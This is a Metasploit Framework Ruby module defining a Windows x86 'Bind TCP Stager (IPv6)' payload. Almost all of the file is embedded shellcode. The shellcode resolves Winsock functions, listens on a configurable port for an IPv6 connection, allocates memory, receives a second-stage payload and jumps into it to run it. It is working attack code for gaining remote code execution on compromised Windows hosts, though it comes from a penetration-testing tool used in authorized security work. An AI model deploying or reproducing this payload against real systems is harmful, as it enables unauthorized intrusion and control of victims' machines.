##
# $Id: bind_ipv6_tcp.rb 6744 2009-07-05 20:24:37Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'


module Metasploit3

	include Msf::Payload::Stager
	include Msf::Payload::Windows

	def self.handler_type_alias
		"bind_ipv6_tcp"
	end
	
	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Bind TCP Stager (IPv6)',
			'Version'       => '$Revision: 6744 $',
			'Description'   => 'Listen for a connection over IPv6',
			'Author'        => ['hdm', 'skape'],
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::BindTcp,
			'Convention'    => 'sockedi',
			'Stager'        =>
				{
					'Offsets' =>
						{
							'LPORT'   => [ 285+1, 'n' ],
						},
					'Payload' =>
						"\xfc"+
						"\xe8\x56\x00\x00\x00\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b\x45\x3c" + 
						"\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x32" + 
						"\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38\xe0\x74\x07" + 
						"\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1\x8b\x5a\x24" + 
						"\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8" + 
						"\xeb\x02\x31\xc0\x5f\x5e\x5d\x5b\xc2\x08\x00\x31\xd2\x64\x8b\x52" + 
						"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x6a\x18\x59\x31\xff\x31" + 
						"\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x81" + 
						"\xff\x5b\xbc\x4a\x6a\x8b\x5a\x10\x8b\x12\x75\xdb\x5e\x53\x68\x8e" + 
						"\x4e\x0e\xec\xff\xd6\x89\xc7\x53\x68\x54\xca\xaf\x91\xff\xd6\x81" + 
						"\xec\x00\x01\x00\x00\x50\x57\x56\x53\x89\xe5\xe8\x27\x00\x00\x00" + 
						"\x90\x01\x00\x00\xb6\x19\x18\xe7\xa4\x19\x70\xe9\xe5\x49\x86\x49" + 
						"\xa4\x1a\x70\xc7\xa4\xad\x2e\xe9\xd9\x09\xf5\xad\xcb\xed\xfc\x3b" + 
						"\x57\x53\x32\x5f\x33\x32\x00\x5b\x8d\x4b\x20\x51\xff\xd7\x89\xdf" + 
						"\x89\xc3\x8d\x75\x14\x6a\x07\x59\x51\x53\xff\x34\x8f\xff\x55\x04" + 
						"\x59\x89\x04\x8e\xe2\xf2\x2b\x27\x54\x68\x02\x02\x00\x00\xff\x55" + 
						"\x30\x31\xc0\x50\x50\x50\x6a\x06\x6a\x01\x6a\x17\xff\x55\x2c\x89" + 
						"\xc7\x6a\x00\x31\xc9\x51\x51\x51\x51\x51\x68\x17\x00\xff\xff\x89" + 
						"\xe1\x6a\x1c\x51\x57\xff\x55\x24\x31\xdb\x53\x57\xff\x55\x28\x53" + 
						"\x53\x57\xff\x55\x20\x89\xc7\x6a\x40\x5e\x56\xc1\xe6\x06\x56\xc1" + 
						"\xe6\x08\x56\x6a\x00\xff\x55\x0c\x89\xc3\x6a\x00\x68\x00\x10\x00" + 
						"\x00\x53\x57\xff\x55\x18\xff\xd3"
				}
			))			
	end

end
